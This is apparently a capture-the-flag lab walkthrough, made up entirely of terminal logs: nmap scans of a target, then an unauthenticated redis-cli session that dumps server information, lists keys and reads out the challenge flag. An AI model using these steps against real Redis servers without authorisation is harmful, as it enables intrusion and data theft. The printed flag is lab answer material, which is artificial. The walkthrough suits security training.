# Redeemer

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ping 10.129.111.85
PING 10.129.111.85 (10.129.111.85) 56(84) bytes of data.
64 bytes from 10.129.111.85: icmp_seq=1 ttl=63 time=23.7 ms
64 bytes from 10.129.111.85: icmp_seq=2 ttl=63 time=23.3 ms
64 bytes from 10.129.111.85: icmp_seq=3 ttl=63 time=23.9 ms
64 bytes from 10.129.111.85: icmp_seq=4 ttl=63 time=23.5 ms
64 bytes from 10.129.111.85: icmp_seq=5 ttl=63 time=25.0 ms
64 bytes from 10.129.111.85: icmp_seq=6 ttl=63 time=22.9 ms
^C
--- 10.129.111.85 ping statistics ---
6 packets transmitted, 6 received, 0% packet loss, time 5014ms
rtt min/avg/max/mdev = 22.871/23.721/24.987/0.658 ms
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -p- 10.129.111.85
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 19:03 EDT
Nmap scan report for 10.129.111.85
Host is up (0.056s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 28.99 seconds
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sS -p 1-10000 -sV -v 10.129.111.85
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 19:13 EDT
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 19:13
Scanning 10.129.111.85 [4 ports]
Completed Ping Scan at 19:13, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:13
Completed Parallel DNS resolution of 1 host. at 19:13, 0.01s elapsed
Initiating SYN Stealth Scan at 19:13
Scanning 10.129.111.85 [10000 ports]
Discovered open port 6379/tcp on 10.129.111.85
Completed SYN Stealth Scan at 19:13, 2.70s elapsed (10000 total ports)
Initiating Service scan at 19:13
Scanning 1 service on 10.129.111.85
Completed Service scan at 19:13, 6.06s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.111.85.
Initiating NSE at 19:13
Completed NSE at 19:13, 0.01s elapsed
Initiating NSE at 19:13
Completed NSE at 19:13, 0.00s elapsed
Nmap scan report for 10.129.111.85
Host is up (0.026s latency).
Not shown: 9999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds
           Raw packets sent: 10004 (440.152KB) | Rcvd: 10001 (400.032KB)
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ redis-cli -h 10.129.111.85
10.129.111.85:6379> INFO
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:750
run_id:875ed31ff1f7937050799e6244f53353eb45ec2d
tcp_port:6379
uptime_in_seconds:2511
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:14475257
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:5836800
used_memory_rss_human:5.57M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:847166
used_memory_startup:797248
used_memory_dataset:12458
used_memory_dataset_perc:19.97%
allocator_allocated:1570168
allocator_active:1937408
allocator_resident:9158656
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.23
allocator_frag_bytes:367240
allocator_rss_ratio:4.73
allocator_rss_bytes:7221248
rss_overhead_ratio:0.64
rss_overhead_bytes:-3321856
mem_fragmentation_ratio:7.14
mem_fragmentation_bytes:5019184
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1725749679
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:421888
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:8
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:545
total_net_output_bytes:14983
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:479
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:efd84e559c1abd97184c64adc4a431b1881e02bb
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:2.706086
used_cpu_user:2.537483
used_cpu_sys_children:0.000000
used_cpu_user_children:0.001752

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
10.129.111.85:6379> 
```

```
10.129.111.85:6379> select 0
OK
```

```
10.129.111.85:6379> keys *
1) "temp"
2) "numb"
3) "flag"
4) "stor"
```

```
10.129.111.85:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```
